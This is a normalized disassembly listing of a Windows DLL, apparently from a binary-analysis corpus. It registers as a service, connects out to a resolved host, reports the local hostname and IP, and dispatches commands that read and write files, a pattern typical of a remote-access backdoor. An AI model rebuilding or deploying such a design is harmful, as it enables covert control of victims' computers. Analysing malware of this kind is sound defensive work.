sub_10001100
mov eax [ esp + 0x8 ]
dec eax
jne r-xdata
mov eax 0x1
retn 0xc
mov edx [ esp + 0x4 ]
push edi
mov ecx 0x41
xor eax eax
mov edi rw-data
push 0x104
push rw-data
push edx
[ edi ]
mov [ rw-data ] edx
call [ GetModuleFileNameA@IAT ]
mov [ rw-data ] eax
mov ecx 0x33
xor eax eax
mov edi rw-data
[ edi ]
push 0x10
push rw-data
push rw-data
mov ecx rw-data
call sub_10004ac1
push 0x1
push 0x10
push rw-data
push 0xcc
push rw-data
push rw-data
mov ecx rw-data
call sub_10004be3
mov eax 0x1
pop edi
retn 0xc
ServiceMain
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_100055ce
push eax
mov [ fs : 0x0 ] esp
sub esp 0x104
lea ecx [ esp + 0x4 ]
push esi
mov esi [ esp + 0x11c ]
push 0x100
mov eax [ esi ]
push eax
push ecx
call [ strncpy@IAT ]
mov edx [ esi ]
push 0x100
lea eax [ esp + 0x18 ]
push edx
push eax
call [ wcstombs@IAT ]
add esp 0x18
lea ecx [ esp + 0x8 ]
push sub_100014a0
push ecx
call [ RegisterServiceCtrlHandlerA@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov ecx [ esp + 0x108 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x110
retn 0x8
push ebx
push ebp
push edi
push 0x1
push 0x0
push 0x2
call sub_10001440
mov ebx [ Sleep@IAT ]
add esp 0xc
push 0x3e8
call ebx
push 0x0
push 0x0
push 0x4
call sub_10001440
mov esi [ CreateEventA@IAT ]
add esp 0xc
push 0x0
push 0x0
push 0x1
push 0x0
call esi
push 0x0
push 0x0
push 0x1
push 0x0
mov [ rw-data ] eax
call esi
push 0x0
push 0x0
push 0x1
push 0x0
mov [ rw-data ] eax
call esi
push 0x0
push 0x0
push 0x1
push 0x0
mov [ rw-data ] eax
call esi
push 0x0
push 0x0
push 0x1
push 0x0
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call [ WSACreateEvent@IAT ]
mov [ rw-data ] eax
call sub_100019a0
test eax eax
jne r-xdata
mov ebp [ SetEvent@IAT ]
mov ecx 0x7
xor eax eax
mov edi rw-data
[ edi ]
mov edi [ WaitForSingleObject@IAT ]
push 0x40080000
push 0x0
push 0x1
call sub_10002990
add esp 0xc
push eax
call ebx
call sub_100019a0
test eax eax
je r-xdata
xor esi esi
mov eax [ rw-data ]
mov ecx [ rw-data ]
xor esi esi
push eax
push ecx
push esi
mov [ rw-data ] esi
call sub_10002990
mov edx [ rw-data ]
add esp 0xc
push eax
push edx
call edi
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_1000366a
jmp r-xdata
mov edx [ rw-data ]
push edx
call ebp
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
mov ecx esi
call sub_1000470e
push esi
call ??3@YAXPAX@Z
add esp 0x4
mov [ rw-data ] eax
mov [ eax ] sub_10001c50
mov eax [ rw-data ]
push esi
push esi
push esi
mov [ eax + 0x4 ] sub_100022e0
mov ecx [ rw-data ]
push sub_10001550
push esi
mov [ ecx + 0x8 ] sub_10002980
mov edx [ rw-data ]
push esi
mov [ esp + 0x134 ] 0xffffffff
mov [ edx + 0xc ] esi
mov eax [ rw-data ]
mov [ eax + 0x10 ] sub_100019f0
call [ _beginthreadex@IAT ]
mov ecx [ rw-data ]
add esp 0x18
mov [ rw-data ] eax
push 0xffffffff
push ecx
call edi
push 0x3e8
call ebx
mov edx [ rw-data ]
push edx
call ebp
mov eax [ rw-data ]
push 0x2
push eax
call [ shutdown@IAT ]
mov ecx [ rw-data ]
push ecx
call [ closesocket@IAT ]
mov esi [ rw-data ]
test esi esi
je r-xdata
push 0x40
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp + 0x10 ] eax
cmp eax esi
mov [ esp + 0x11c ] esi
je r-xdata
call sub_10001ea0
call [ WSACleanup@IAT ]
pop edi
pop ebp
pop ebx
jmp r-xdata
mov edx [ rw-data ]
mov esi [ ResetEvent@IAT ]
push edx
call esi
mov eax [ rw-data ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
cmp [ rw-data ] 0x1
jne r-xdata
sub_10001440
sub esp 0x1c
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
mov [ rw-data ] eax
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x24 ]
lea edx [ esp ]
mov [ esp + 0xc ] eax
mov eax [ rw-data ]
push edx
push eax
mov [ esp + 0x8 ] 0x10
mov [ esp + 0x10 ] 0x7
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] 0xbb8
call [ SetServiceStatus@IAT ]
add esp 0x1c
retn
sub_100014a0
mov eax [ esp + 0x4 ]
dec eax
cmp eax 0x4
ja r-xdata
retn 0x4
jmp [ eax * 4 + jump_table_10001538 ]
push 0x1
push 0x0
push 0x3
call sub_10001440
mov ecx [ rw-data ]
add esp 0xc
push ecx
call [ SetEvent@IAT ]
push 0x1388
call [ Sleep@IAT ]
push 0x0
push 0x0
push 0x1
call sub_10001440
add esp 0xc
push 0x1
push 0x0
push 0x6
call sub_10001440
push 0x0
push 0x0
push 0x7
call sub_10001440
add esp 0x18
retn 0x4
push 0x1
push 0x0
push 0x5
call sub_10001440
push 0x0
push 0x0
push 0x4
call sub_10001440
add esp 0x18
retn 0x4
mov edx [ rw-data ]
push 0x0
push 0x0
push edx
call sub_10001440
add esp 0xc
retn 0x4
sub_10001550
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x40
push ebx
push ebp
push esi
push edi
mov ecx 0x7
xor eax eax
lea edi [ esp + 0x31 ]
mov [ esp + 0x30 ] 0x0
[ edi ]
mov ecx [ rw-data ]
mov ebp [ ResetEvent@IAT ]
stosw [ edi ]
stosb [ edi ]
mov eax [ rw-data ]
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] ecx
mov [ esp + 0x14 ] 0x0
push 0x40080000
push 0x0
push 0x1
call sub_10002990
mov edx [ rw-data ]
add esp 0xc
push eax
push edx
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov esi [ _strnicmp@IAT ]
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x30 ]
push ecx
push rw-data
push eax
call esi
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
pop ebp
pop ebx
mov esp ebp
pop ebp
retn 0x4
jmp r-xdata
push 0x40080000
push 0x0
push 0x1
call sub_10002990
add esp 0xc
push eax
mov eax [ rw-data ]
push eax
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x34 ]
push rw-data
push ecx
call esi
add esp 0xc
test eax eax
je r-xdata
mov edi 0x2
mov edx [ eax + 0xc ]
mov eax [ edx ]
mov ecx [ eax ]
push ecx
call [ inet_ntoa@IAT ]
mov edx eax
mov ecx 0x8
xor eax eax
lea edi [ esp + 0x30 ]
[ edi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea ebx [ esp + 0x30 ]
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
push 0x0
push 0x0
push 0x0
push 0x6
push 0x1
push 0x2
call [ WSASocketA@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
mov eax [ rw-data ]
push eax
call [ closesocket@IAT ]
mov edi 0x2
push rw-data
mov [ esp + 0x24 ] di
call [ atoi@IAT ]
add esp 0x4
push eax
call [ htons@IAT ]
lea edx [ esp + 0x30 ]
push edx
mov [ esp + 0x26 ] ax
call [ inet_addr@IAT ]
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x10 ]
inc eax
cmp eax 0x3
mov [ esp + 0x10 ] eax
jg r-xdata
mov eax [ esp + 0x14 ]
or ecx 0xffffffff
shl eax 0x6
lea edx [ esp + 0x30 ]
lea ebx [ eax + rw-data ]
xor eax eax
mov edi ebx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x30 ]
push ecx
call [ inet_addr@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x10 ] 0x0
push ecx
call [ closesocket@IAT ]
jmp r-xdata
mov eax [ esp + 0x14 ]
inc eax
cmp eax edi
mov [ esp + 0x14 ] eax
jl r-xdata
xor ebx ebx
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x23
push eax
push ecx
call [ WSAEventSelect@IAT ]
mov esi [ _beginthreadex@IAT ]
push ebx
push ebx
push ebx
push sub_10001a20
push ebx
push ebx
call esi
mov edx [ rw-data ]
add esp 0x18
mov [ rw-data ] eax
push edx
call ebp
mov ecx [ rw-data ]
lea eax [ esp + 0x30 ]
push 0xc0
push eax
call sub_1000367e
push 0x7530
lea ecx [ esp + 0x1c ]
push ebx
push ecx
push edi
call [ WaitForMultipleObjects@IAT ]
sub eax ebx
je r-xdata
cmp [ esp + 0x14 ] edi
jne r-xdata
mov edx [ rw-data ]
push edx
call [ closesocket@IAT ]
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
mov esp ebp
pop ebp
retn 0x4
dec eax
je r-xdata
push 0x3fe00000
push ebx
push 0x1
call sub_10002990
mov edx [ rw-data ]
add esp 0xc
push eax
push edx
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov [ esp + 0x14 ] ebx
call [ GetTickCount@IAT ]
mov [ rw-data ] eax
call sub_10001d60
push ebx
push ebx
push ebx
push sub_100018f0
push ebx
push ebx
call esi
add esp 0x18
mov [ rw-data ] eax
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x101
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
inc eax
cmp eax 0x3
mov [ esp + 0x10 ] eax
jle r-xdata
mov edx [ rw-data ]
push edx
call [ closesocket@IAT ]
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
push 0x3fe00000
push ebx
push 0x1
call sub_10002990
mov ecx [ rw-data ]
add esp 0xc
push eax
push ecx
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x20 ]
push 0x10
push eax
push ecx
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
push edx
call ebp
mov [ esp + 0x10 ] 0x3
sub_100018f0
sub esp 0xc
xor eax eax
push esi
mov esi [ GetTickCount@IAT ]
mov [ esp + 0x5 ] eax
mov [ esp + 0x9 ] eax
push edi
mov edi [ WaitForSingleObject@IAT ]
mov [ esp + 0x11 ] ax
mov [ esp + 0x13 ] al
mov [ esp + 0xc ] 0x6
mov [ esp + 0x8 ] 0x8
pop edi
xor eax eax
pop esi
add esp 0xc
retn 0x4
call esi
sub eax [ rw-data ]
cdq
xor eax edx
sub eax edx
cmp eax 0x2bf20
jbe r-xdata
mov ecx [ rw-data ]
push 0x2bf20
push ecx
call edi
test eax eax
je r-xdata
mov ecx rw-data
call sub_10005088
mov edx [ esp + 0x8 ]
mov ecx [ rw-data ]
lea eax [ esp + 0x8 ]
push edx
push eax
call sub_10003f32
mov ecx rw-data
call sub_10005090
mov ecx rw-data
call sub_10005088
call esi
mov ecx rw-data
mov [ rw-data ] eax
call sub_10005090
jmp r-xdata
sub_100019a0
sub esp 0x190
lea eax [ esp ]
push esi
mov esi [ WSAStartup@IAT ]
push eax
push 0x202
call esi
test eax eax
je r-xdata
mov eax 0x1
pop esi
add esp 0x190
retn
call [ WSACleanup@IAT ]
lea ecx [ esp + 0x4 ]
push ecx
push 0x202
call esi
test eax eax
je r-xdata
xor eax eax
pop esi
add esp 0x190
retn
sub_10001a20
sub esp 0x30
push ebx
mov ebx [ WSAWaitForMultipleEvents@IAT ]
push esi
push edi
push 0x3e8
call [ Sleep@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x30
retn 0x4
push 0x0
push 0xbb8
push 0x0
push rw-data
push 0x1
call ebx
cmp eax 0x102
je r-xdata
mov eax [ rw-data ]
push eax
call [ WSAResetEvent@IAT ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
push 0x0
push eax
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov ecx 0xb
xor eax eax
lea edi [ esp + 0x10 ]
[ edi ]
mov eax [ rw-data ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
push eax
call [ WSAEnumNetworkEvents@IAT ]
mov ecx [ rw-data ]
push ecx
call [ WSAResetEvent@IAT ]
mov al [ esp + 0x10 ]
test al 0x1
je r-xdata
test al 0x2
je r-xdata
mov eax [ rw-data ]
mov esi [ esp + 0x14 ]
lea edx [ esp + 0xc ]
mov [ esp + 0xc ] 0x0
push edx
push 0x4004667f
push eax
call [ ioctlsocket@IAT ]
mov eax [ esp + 0xc ]
test eax eax
jbe r-xdata
test al 0x20
je r-xdata
mov ecx [ esp + 0x18 ]
push ecx
push 0x0
call sub_10001c10
add esp 0x8
jmp r-xdata
push esi
push 0x0
call sub_10001b40
add esp 0x8
jmp r-xdata
mov edx [ esp + 0x28 ]
push edx
push 0x0
call sub_10001c20
add esp 0x8
jmp r-xdata
sub_10001b40
push ebp
mov ebp esp
push 0xffffffff
push sub_100055e0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x2004
call sub_100034e0
push ebx
push esi
push edi
mov ecx 0x801
xor eax eax
lea edi [ ebp - 0x2014 ]
[ edi ]
mov ecx [ rw-data ]
mov [ ebp - 0x10 ] esp
lea eax [ ebp - 0x2014 ]
push 0x2004
push eax
push ecx
call sub_10001a00
add esp 0xc
mov ecx rw-data
mov esi eax
call sub_10005088
call [ GetTickCount@IAT ]
mov ecx rw-data
mov [ rw-data ] eax
call sub_10005090
cmp esi 0xffffffff
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_10005088
mov ecx [ rw-data ]
lea edx [ ebp - 0x2014 ]
push esi
push edx
call sub_10004126
mov ecx rw-data
call sub_10005090
sub_10001c50
mov eax [ rw-data ]
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
push eax
call [ ResetEvent@IAT ]
test esi esi
jle r-xdata
mov ecx rw-data
call sub_10005088
call [ GetTickCount@IAT ]
mov ecx rw-data
mov [ rw-data ] eax
call sub_10005090
pop edi
pop esi
pop ebp
mov al 0x1
pop ebx
retn
mov ebx [ send@IAT ]
mov ebp [ WaitForSingleObject@IAT ]
mov edi [ esp + 0x14 ]
test eax eax
je r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
add edi eax
sub esi eax
mov edx [ rw-data ]
mov [ rw-data ] 0x1
push edx
mov [ rw-data ] 0x47ae147b
mov [ rw-data ] 0x3f847ae1
call [ SetEvent@IAT ]
pop edi
pop esi
pop ebp
xor al al
pop ebx
retn
mov edx [ rw-data ]
push 0xea60
push edx
call ebp
cmp eax 0x102
je r-xdata
mov ecx [ rw-data ]
push 0x0
push esi
push edi
push ecx
call ebx
cmp eax 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] 0x1
push ecx
mov [ rw-data ] 0x47ae147b
mov [ rw-data ] 0x3f847ae1
call [ SetEvent@IAT ]
pop edi
pop esi
pop ebp
xor al al
pop ebx
retn
mov eax [ rw-data ]
push eax
call [ ResetEvent@IAT ]
jmp r-xdata
test esi esi
jg r-xdata
sub_10001d60
mov eax 0x2084
call sub_100034e0
push esi
push edi
mov edx [ r--data ]
mov ecx 0x801
xor eax eax
lea edi [ esp + 0x88 ]
[ edi ]
mov edi edx
or ecx 0xffffffff
mov [ esp + 0x8c ] eax
mov esi edx
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x90 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
add ecx 0x7
mov [ esp + 0x88 ] ecx
push ecx
lea ecx [ esp + 0x8c ]
push ecx
mov ecx [ rw-data ]
call sub_10003f32
mov ecx 0x801
xor eax eax
lea edi [ esp + 0x88 ]
lea edx [ esp + 0x8 ]
push 0x80
push edx
[ edi ]
call [ gethostname@IAT ]
lea eax [ esp + 0x8 ]
push eax
call [ gethostbyname@IAT ]
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ inet_ntoa@IAT ]
mov edx eax
lea edi [ esp + 0x8 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea esi [ esp + 0x8 ]
mov eax ecx
lea edi [ esp + 0x94 ]
shr ecx 0x2
mov [ esp + 0x8c ] 0x8
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov esi edx
mov edx ecx
lea edi [ esp + 0x114 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ rw-data ]
lea eax [ esp + 0x88 ]
push 0xac
push eax
mov [ esp + 0x98 ] 0x1
mov [ esp + 0x90 ] 0xac
call sub_10003f32
pop edi
pop esi
add esp 0x2084
retn
sub_10001ea0
mov eax [ rw-data ]
push esi
push eax
call [ closesocket@IAT ]
mov ecx [ rw-data ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
mov eax [ rw-data ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
mov eax [ rw-data ]
push eax
call [ WSACloseEvent@IAT ]
pop esi
retn
sub_10001ef0
push 0xffffffff
mov eax [ fs : 0x0 ]
push sub_10005677
push eax
mov eax 0x22ac
mov [ fs : 0x0 ] esp
call sub_100034e0
push ebx
push ebp
push esi
push edi
mov ecx 0x40
xor eax eax
lea edi [ esp + 0xb1 ]
mov [ esp + 0xb0 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x1b5 ]
mov [ esp + 0x1b4 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x801
xor eax eax
lea edi [ esp + 0x2b8 ]
xor esi esi
[ edi ]
mov edi [ esp + 0x22cc ]
lea eax [ esp + 0x1b4 ]
lea ecx [ esp + 0xb0 ]
push eax
push ecx
lea edx [ edi + 0x8 ]
push rw-data
push edx
mov [ esp + 0x24 ] esi
call [ sscanf@IAT ]
mov ecx [ std::basic_fstream<char,struct std::char_traits<char> >::`vcall'@IAT ]
mov eax [ std::basic_fstream<char,struct std::char_traits<char> >::`vcall'@IAT ]
mov [ esp + 0x34 ] ecx
add esp 0x10
lea ecx [ esp + 0x7c ]
mov [ esp + 0x1c ] eax
call [ std::ios_base::ios_base@IAT ]
mov edx [ std::basic_ios<char,struct std::char_traits<char> >::`vbtable'@IAT ]
mov ebx 0x1
mov [ esp + 0x7c ] edx
mov [ esp + 0x14 ] ebx
lea eax [ esp + 0x28 ]
push esi
push eax
lea ecx [ esp + 0x24 ]
mov [ esp + 0x22cc ] esi
call [ std::basic_iostream<char,struct std::char_traits<char> >::basic_iostream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ esp + 0x28 ]
mov [ esp + 0x22c4 ] ebx
mov [ esp + 0x10 ] ecx
lea ecx [ esp + 0x28 ]
call [ std::basic_streambuf<char,struct std::char_traits<char> >::basic_streambuf<char,struct std::char_traits<char> >@IAT ]
lea ecx [ esp + 0x74 ]
call [ std::locale::locale@IAT ]
mov edx [ std::basic_filebuf<char,struct std::char_traits<char> >::`vbtable'@IAT ]
push esi
push esi
lea ecx [ esp + 0x30 ]
mov [ esp + 0x22cc ] 0x3
mov [ esp + 0x30 ] edx
call [ std::basic_filebuf<char,struct std::char_traits<char> >::_Init@IAT ]
mov eax [ esp + 0x1c ]
mov edx [ std::basic_fstream<char,struct std::char_traits<char> >::`vbtable'@IAT ]
mov [ esp + 0x22c4 ] 0x4
push 0x21
mov ecx [ eax + 0x4 ]
mov [ esp + ecx + 0x20 ] edx
lea eax [ esp + 0xb4 ]
lea ecx [ esp + 0x2c ]
push eax
call [ std::basic_filebuf<char,struct std::char_traits<char> >::open@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov ebp [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
mov [ esp + 0x22c4 ] 0x5
mov ecx [ eax + 0x4 ]
mov eax [ esp + ecx + 0x20 ]
test al 0x6
je r-xdata
mov ecx [ esp + 0x1c ]
push esi
push 0x2
mov edx [ ecx + 0x4 ]
lea ecx [ esp + edx + 0x24 ]
call [ std::basic_ios<char,struct std::char_traits<char> >::setstate@IAT ]
mov eax [ edi + 0x4 ]
sub esp 0x18
mov esi esp
mov [ esp + 0x28 ] esp
mov [ esi ] eax
mov ecx [ std::_Fpz@IAT ]
mov edx [ ecx ]
mov [ esi + 0x8 ] edx
mov eax [ ecx + 0x4 ]
lea ecx [ esp + 0x28 ]
mov [ esi + 0xc ] eax
call [ std::_Lockit::_Lockit@IAT ]
mov ecx [ rw-data ]
mov [ esi + 0x10 ] ecx
lea ecx [ esp + 0x28 ]
call [ std::_Lockit::~_Lockit@IAT ]
lea ecx [ esp + 0x34 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::seekg@IAT ]
lea edx [ esp + 0x2c0 ]
mov esi 0x4
push 0x1ffc
push edx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x2c4 ] esi
call [ std::basic_istream<char,struct std::char_traits<char> >::read@IAT ]
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov ecx rw-data
mov [ esp + 0x2bc ] 0x3
mov [ esp + 0x2c0 ] 0x2
mov [ esp + 0x2c4 ] 0xffffffff
mov [ esp + 0x2b8 ] 0x10
call sub_10005088
mov edx [ esp + 0x2b8 ]
mov ecx [ rw-data ]
lea eax [ esp + 0x2b8 ]
push edx
push eax
call sub_10003f32
mov ecx rw-data
call sub_10005090
push edi
push esi
call ebx
push eax
call ebp
push esi
call [ _endthreadex@IAT ]
add esp 0x4
mov ecx rw-data
mov [ esp + 0x2bc ] 0x3
mov [ esp + 0x2c4 ] 0xffffffff
mov [ esp + 0x2c0 ] esi
mov [ esp + 0x2b8 ] 0x10
call sub_10005088
mov eax [ esp + 0x2b8 ]
lea ecx [ esp + 0x2b8 ]
push eax
push ecx
mov ecx [ rw-data ]
call sub_10003f32
mov ecx rw-data
call sub_10005090
push edi
push 0x0
call ebx
push eax
call ebp
lea edx [ esp + 0x7c ]
mov eax [ esp + 0x1c ]
mov [ esp + 0x14 ] edx
mov edx [ std::basic_fstream<char,struct std::char_traits<char> >::`vbtable'@IAT ]
mov ecx [ eax + 0x4 ]
mov [ esp + ecx + 0x1c ] edx
mov ecx [ std::basic_filebuf<char,struct std::char_traits<char> >::`vbtable'@IAT ]
lea eax [ esp + 0x28 ]
mov [ esp + 0x22c4 ] 0x6
mov [ esp + 0x18 ] eax
mov [ esp + 0x28 ] ecx
mov al [ esp + 0x70 ]
mov [ esp + 0x22c4 ] 0x8
test al al
je r-xdata
add eax 0x8
mov ecx rw-data
mov [ esp + 0x2b8 ] eax
call sub_10005088
mov eax [ esp + 0x2b8 ]
lea ecx [ esp + 0x2b8 ]
push eax
push ecx
mov ecx [ rw-data ]
call sub_10003f32
mov ecx rw-data
call sub_10005090
lea edx [ esp + 0x2c0 ]
push 0x1ffc
push edx
lea ecx [ esp + 0x24 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::read@IAT ]
mov eax [ esp + 0x20 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x6c ]
test ecx ecx
mov edi ecx
je r-xdata
lea ecx [ esp + 0x28 ]
call [ std::basic_filebuf<char,struct std::char_traits<char> >::close@IAT ]
lea ecx [ esp + 0x74 ]
call [ std::locale::~locale@IAT ]
lea ecx [ esp + 0x28 ]
mov [ esp + 0x22c4 ] 0x6
call [ std::basic_streambuf<char,struct std::char_traits<char> >::~basic_streambuf<char,struct std::char_traits<char> >@IAT ]
lea ecx [ esp + 0x28 ]
mov [ esp + 0x22c4 ] 0xffffffff
call [ std::basic_iostream<char,struct std::char_traits<char> >::~basic_iostream<char,struct std::char_traits<char> >@IAT ]
mov edx [ std::basic_ios<char,struct std::char_traits<char> >::`vbtable'@IAT ]
lea ecx [ esp + 0x7c ]
mov [ esp + 0x7c ] edx
call [ std::ios_base::~ios_base@IAT ]
mov ecx [ esp + 0x22bc ]
pop edi
pop esi
pop ebp
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x22b8
retn 0x4
push 0x1
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
push edi
call ??3@YAXPAX@Z
add esp 0x4
sub_100022e0
mov al [ rw-data ]
sub esp 0x134
test al 0x1
jne r-xdata
push esi
push edi
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x39 ]
mov [ esp + 0x38 ] 0x0
[ edi ]
mov esi [ esp + 0x140 ]
stosw [ edi ]
stosb [ edi ]
mov eax [ esi + 0x4 ]
dec eax
cmp eax 0xd
ja r-xdata
or al 0x1
push 0x1
mov ecx rw-data
mov [ rw-data ] al
call [ std::basic_fstream<char,struct std::char_traits<char> >::basic_fstream<char,struct std::char_traits<char> >@IAT ]
push sub_10002960
call sub_100034bc
add esp 0x4
mov [ esi + 0x4 ] 0x9
mov [ esi ] 0x8
mov ecx [ rw-data ]
push 0x8
push esi
call sub_10003f32
jmp [ eax * 4 + jump_table_10002920 ]
push 0x0
push 0x0
push 0x0
push sub_10002a20
push 0x0
push 0x0
call [ _beginthreadex@IAT ]
add esp 0x18
pop edi
pop esi
add esp 0x134
retn
lea edi [ esi + 0x8 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ rw-data ]
push ecx
call [ SetEvent@IAT ]
pop edi
pop esi
add esp 0x134
retn
mov eax [ esi + 0x8 ]
sub eax 0x0
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
sub eax 0x0
je r-xdata
add esi 0x8
push esi
call [ atof@IAT ]
fst [ rw-data ]
fcomp [ r--data ]
add esp 0x4
fnstsw ax
test ah 0x40
je r-xdata
call sub_10002fe0
pop edi
pop esi
add esp 0x134
retn
add esi 0x8
push esi
call sub_100030b0
add esp 0x4
pop edi
pop esi
add esp 0x134
retn
lea edx [ esi + 0x8 ]
push edx
call sub_10003260
add esp 0x4
lea edx [ esp + 0x38 ]
push rw-data
push edx
add esi 0x10
push rw-data
push esi
call [ sscanf@IAT ]
mov eax [ rw-data ]
add esp 0x10
test eax eax
mov esi 0x2
jne r-xdata
mov esi 0x2
sub eax esi
je r-xdata
pop edi
pop esi
add esp 0x134
retn
mov ecx [ esi ]
add esi 0x8
sub ecx 0x8
push ecx
push esi
mov ecx rw-data
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
pop edi
pop esi
add esp 0x134
retn
push 0x10c
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ rw-data ] eax
mov [ eax ] 0x0
lea eax [ esp + 0x38 ]
push rw-data
lea edi [ esi + 0x10 ]
push eax
push rw-data
push edi
call [ sscanf@IAT ]
mov ecx [ rw-data ]
xor eax eax
lea edx [ ecx + 0x8 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
push ecx
push rw-data
push rw-data
mov [ rw-data ] 0x3
mov [ rw-data ] 0x1
mov [ rw-data ] 0xffffffff
call [ strncpy@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x1c
[ edi ]
not ecx
add ecx 0x10
mov [ rw-data ] ecx
push ecx
mov ecx [ rw-data ]
push rw-data
call sub_10003f32
pop edi
pop esi
add esp 0x134
retn
dec eax
je r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] 0x1
call sub_10003d71
mov ecx [ rw-data ]
push ecx
call [ SetEvent@IAT ]
pop edi
pop esi
add esp 0x134
retn
mov [ rw-data ] 0x0
mov [ rw-data ] 0x40080000
mov ecx [ rw-data ]
push 0x0
mov ecx [ ecx + 0x4 ]
add ecx rw-data
mov edx [ ecx + 0x4 ]
or edx esi
push edx
call [ std::basic_ios<char,struct std::char_traits<char> >::clear@IAT ]
push 0x2a
push rw-data
call [ std::__Fiopen@IAT ]
add esp 0x8
test eax eax
je r-xdata
